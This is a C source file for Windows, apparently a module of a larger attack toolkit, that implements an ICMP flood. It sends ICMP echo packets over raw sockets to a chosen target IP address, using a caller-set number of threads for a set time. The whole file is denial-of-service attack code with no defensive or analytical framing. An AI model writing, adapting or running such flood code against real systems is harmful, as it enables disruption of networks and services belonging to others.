#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include "attacks.h"

#pragma comment(lib, "ws2_32.lib")

typedef struct icmp_header {
    unsigned char type;        
    unsigned char code;        
    unsigned short checksum;   
    unsigned short id;        
    unsigned short seq;        
} ICMP_HDR;

unsigned short in_cksum(unsigned short *addr, int len) {
    int nleft = len;
    int sum = 0;
    unsigned short *w = addr;
    unsigned short answer = 0;

    while (nleft > 1) {
        sum += *w++;
        nleft -= 2;
    }

    if (nleft == 1) {
        *(unsigned char *)(&answer) = *(unsigned char *)w;
        sum += answer;
    }

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    answer = ~sum;
    return answer;
}

DWORD WINAPI icmp_flood_thread(LPVOID arg) {
    attack_args *args = (attack_args *)arg;
    SOCKET sock;
    struct sockaddr_in target;
    char packet[sizeof(ICMP_HDR) + 32];
    ICMP_HDR *icmp = (ICMP_HDR *)packet;
    int packet_size = sizeof(ICMP_HDR) + 32;

    sock = WSASocket(AF_INET, SOCK_RAW, IPPROTO_ICMP, NULL, 0, WSA_FLAG_OVERLAPPED);
    if (sock == INVALID_SOCKET) {
        free(args);
        return 0;
    }

    BOOL bOpt = TRUE;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&bOpt, sizeof(bOpt));

    target.sin_family = AF_INET;
    target.sin_addr.s_addr = inet_addr(args->target);

    icmp->type = 8; 
    icmp->code = 0;
    icmp->id = (unsigned short)GetCurrentProcessId();

    char *data = packet + sizeof(ICMP_HDR);
    for (int i = 0; i < 32; i++) {
        data[i] = rand() % 255;
    }

    time_t start_time = time(NULL);

    while (time(NULL) - start_time < args->time) {
        icmp->seq = rand();
        icmp->checksum = 0;
        icmp->checksum = in_cksum((unsigned short *)packet, packet_size);

        sendto(sock, packet, packet_size, 0, (struct sockaddr*)&target, sizeof(target));
        Sleep(10);
    }

    closesocket(sock);
    free(args);
    return 0;
}

void icmp_flood(char *target, int time, int threads) {
    HANDLE thread_handles[100];
    int i;

    for (i = 0; i < threads; i++) {
        attack_args *args = malloc(sizeof(attack_args));
        args->target = target;
        args->time = time;

        thread_handles[i] = CreateThread(NULL, 0, icmp_flood_thread, args, 0, NULL);
        if (thread_handles[i] == NULL) {
            free(args);
            continue;
        }
        Sleep(100);
    }

    WaitForMultipleObjects(threads, thread_handles, TRUE, INFINITE);

    for (i = 0; i < threads; i++) {
        if (thread_handles[i] != NULL) {
            CloseHandle(thread_handles[i]);
        }
    }
} 